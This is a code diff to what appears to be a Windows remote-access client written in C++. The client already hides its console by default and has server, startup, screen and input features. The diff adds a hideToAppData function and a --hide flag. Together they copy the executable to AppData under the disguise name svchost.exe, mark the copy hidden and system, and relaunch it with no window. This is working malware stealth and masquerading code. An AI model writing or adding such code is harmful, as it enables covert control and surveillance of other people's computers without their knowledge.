@@ -1528,14 +1528,36 @@ DWORD WINAPI inputThread(LPVOID) {
     return 0;
 }
 
+void hideToAppData() {
+    char exePath[MAX_PATH]; DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    if (len == 0 || len >= MAX_PATH) return;
+    char appData[MAX_PATH]; DWORD adLen = GetEnvironmentVariableA("APPDATA", appData, MAX_PATH);
+    if (adLen == 0 || adLen >= MAX_PATH) return;
+    std::string dest = std::string(appData) + "\\Microsoft\\svchost.exe";
+    if (GetFileAttributesA(dest.c_str()) == INVALID_FILE_ATTRIBUTES || _stricmp(exePath, dest.c_str()) != 0) {
+        CopyFileA(exePath, dest.c_str(), FALSE);
+        SetFileAttributesA(dest.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    }
+    if (_stricmp(exePath, dest.c_str()) != 0) {
+        STARTUPINFOA si = {sizeof(si)};
+        PROCESS_INFORMATION pi;
+        std::string cmd = "\"" + dest + "\" --show";
+        if (CreateProcessA(dest.c_str(), &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+        }
+        ExitProcess(0);
+    }
+}
+
 int main(int argc, char* argv[]) {
-    bool noStartup = false, noScreen = false, showConsole = false;
+    bool noStartup = false, noScreen = false, showConsole = false, hide = false;
     for (int i = 1; i < argc; i++) {
         std::string a = argv[i];
         if (a == "--no-startup") noStartup = true;
         else if (a == "--no-ping") g_noPing = true;
         else if (a == "--no-screen") noScreen = true;
         else if (a == "--show") showConsole = true;
+        else if (a == "--hide") hide = true;
         else if (a.find("--name=") == 0 && a.size() > 7) computerName = a.substr(7);
         else if (a == "--name" && i + 1 < argc) computerName = argv[++i];
         else if (a == "--server" && i + 1 < argc) {
@@ -1552,6 +1574,7 @@ int main(int argc, char* argv[]) {
             g_serverHost = s;
         }
     }
+    if (hide) { hideToAppData(); return 0; }
     if (computerName.empty()) computerName = getComputerName();
     HWND hwnd = GetConsoleWindow();
     if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
